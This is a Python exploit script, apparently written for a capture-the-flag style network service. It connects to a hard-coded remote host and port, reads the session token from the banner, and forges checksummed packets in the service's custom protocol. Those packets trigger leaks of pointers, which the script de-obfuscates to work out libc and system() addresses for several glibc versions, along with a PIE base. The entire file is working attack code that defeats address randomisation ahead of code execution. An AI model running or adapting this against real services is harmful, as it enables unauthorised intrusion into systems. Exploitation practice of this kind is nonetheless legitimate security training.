#!/usr/bin/env python3
import socket, struct, re, sys

HOST = sys.argv[1] if len(sys.argv) > 1 else "144.79.188.39"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 37082
C = 0x5A5A5A5A41414141


def rd(s, t=2.0):
    s.settimeout(t)
    buf = b""
    try:
        while True:
            d = s.recv(4096)
            if not d:
                break
            buf += d
    except socket.timeout:
        pass
    return buf


def checksum(ptype, plen, payload, token):
    x = ((((ptype << 24) & 0xFFFFFFFF) ^ token) & 0xFFFFFFFF) ^ plen
    x ^= 0x31415926
    x &= 0xFFFFFFFF
    for i in range(plen):
        x = ((x << 5) | (x >> 27)) & 0xFFFFFFFF
        x = (x + ((i * 0x45D9F3B) ^ payload[i])) & 0xFFFFFFFF
    return x & 0xFFFFFFFF


def send_packet(s, ptype, payload, token):
    plen = len(payload)
    ck = checksum(ptype, plen, payload, token)
    s.sendall(f"{ptype}\n{plen}\n{ck:x}\n".encode() + payload)


def setup():
    s = socket.create_connection((HOST, PORT), timeout=8)
    banner = rd(s, 2.0)
    m = re.search(rb"session token: ([0-9a-f]{8})", banner)
    token = int(m.group(1), 16)
    tok12 = (token & 0xFFFFFFFF) << 12

    def pkt(ptype, payload, t=2.0):
        send_packet(s, ptype, payload, token)
        return rd(s, t)

    pkt(2, struct.pack("<I", (token ^ 0xC0FFEE00) & 0xFFFFFFFF))
    pkt(3, struct.pack("<H", 1) + b"A")
    pkt(4, b"\x00\x00\x00")
    return s, token, tok12, pkt


def uncookie(val, tok12):
    return (val ^ C ^ tok12) & 0xFFFFFFFFFFFFFFFF


def main():
    s, token, tok12, pkt = setup()
    leaks = {}
    for ch, name in [(b"P", "proc"), (b"R", "report"), (b"D", "analyzer")]:
        r = pkt(4, ch)
        print(f"RAW {name}: {r!r}")
        m = re.search(rb"0x([0-9a-f]+)", r)
        if m:
            raw = int(m.group(1), 16)
            leaks[name] = uncookie(raw, tok12)
            print(f"  {name} = {hex(leaks[name])}")
    s.close()

    if "proc" in leaks:
        puts = leaks["proc"]
        print("puts", hex(puts), "page", hex(puts & 0xFFF))
        for name, poff, soff in [
            ("2.29-0ubuntu2", 0x83CC0, 0x52FD0),
            ("2.31", 0x875A0, 0x55410),
            ("2.35", 0x80E50, 0x50D60),
            ("2.39", 0x87BD0, 0x58750),
        ]:
            print(f"  if {name}: libc={hex(puts-poff)} system={hex(puts-poff+soff)}")
    if "analyzer" in leaks:
        fp = leaks["analyzer"]
        print("fp", hex(fp), "pie?", hex(fp - 0x157F) if (fp & 0xFFF) == 0x57F else "not 157f")
    if "report" in leaks and "analyzer" in leaks:
        print("report", hex(leaks["report"]))


if __name__ == "__main__":
    main()
